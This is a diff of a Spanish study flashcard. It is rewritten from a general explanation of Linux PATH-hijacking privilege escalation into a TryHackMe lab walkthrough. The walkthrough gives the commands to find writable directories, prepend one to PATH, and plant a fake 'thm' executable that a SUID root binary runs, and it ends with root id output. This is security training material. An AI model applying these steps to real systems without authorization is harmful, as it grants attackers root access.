@@ -1,50 +1,60 @@
-Flashcard – Privilege Escalation via **PATH Hijacking**
+### Flashcard — Escalada de privilegios con PATH hijacking (TryHackMe)
 
-**Concepto:**
+**Contexto**
 
-* `$PATH` define en qué directorios busca Linux los ejecutables.
-* Si un script/binario con **SUID root** ejecuta un comando sin ruta absoluta (`ls`, `cp`, `thm`, etc.), el sistema buscará ese binario en los directorios listados en `$PATH`.
-* Si un directorio dentro de `$PATH` es **escribible por el usuario**, se puede colocar allí un ejecutable malicioso con el mismo nombre, que correrá con privilegios de root.
-
----
-
-**Identificación:**
-
-1. Ver valor de `$PATH`:
-
-   ```bash
-   echo $PATH
-   ```
-2. Buscar directorios escribibles:
-
-   ```bash
-   find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
-   ```
-3. Confirmar si alguno de esos directorios está en `$PATH`.
+* Binario SUID (`test`) ejecuta un comando externo (`thm`).
+* Directorio `/home/murdoch` es world-writable.
+* PATH controlable por el usuario.
 
 ---
 
-**Explotación (ejemplo con `/tmp`):**
+**Procedimiento**
 
-1. Si `/tmp` no está en `$PATH`, añadirlo:
-
-   ```bash
-   export PATH=/tmp:$PATH
-   ```
-
-2. Crear binario malicioso (ejemplo copiando `/bin/bash`):
+1. Revisar permisos y directorios escribibles:
 
    ```bash
-   cp /bin/bash /tmp/thm
-   chmod +x /tmp/thm
+   find / -writable 2>/dev/null
    ```
 
-3. Cuando el programa con **SUID root** ejecute `thm`, en realidad se ejecutará `/tmp/thm` con privilegios de root → escalada de privilegios.
+2. Detectar binario SUID sospechoso:
+
+   ```bash
+   ls -l /home/murdoch/test
+   -rwsr-xr-x 1 root root ...
+   ```
+
+3. Modificar el PATH para priorizar `/home/murdoch`:
+
+   ```bash
+   export PATH=/home/murdoch:$PATH
+   ```
+
+4. Crear binario malicioso que sustituya al comando esperado:
+
+   ```bash
+   echo "/bin/bash" > thm
+   chmod +x thm
+   ```
+
+5. Ejecutar el SUID:
+
+   ```bash
+   ./test
+   ```
+
+6. Confirmar escalada:
+
+   ```bash
+   id
+   uid=0(root) gid=0(root) groups=0(root),1001(karen)
+   ```
 
 ---
 
-**Resumen clave:**
+**Clave técnica**
 
-* Verifica `$PATH` y permisos de escritura.
-* Crea ejecutable falso con el nombre del binario que llama el script SUID.
-* PATH hijacking = root si se cumple que el binario vulnerable tiene SUID.
+* El binario SUID `test` intenta ejecutar `thm` sin ruta absoluta.
+* Como root respeta el `$PATH` del usuario, carga nuestro binario malicioso.
+* Resultado: shell root.
+
+---
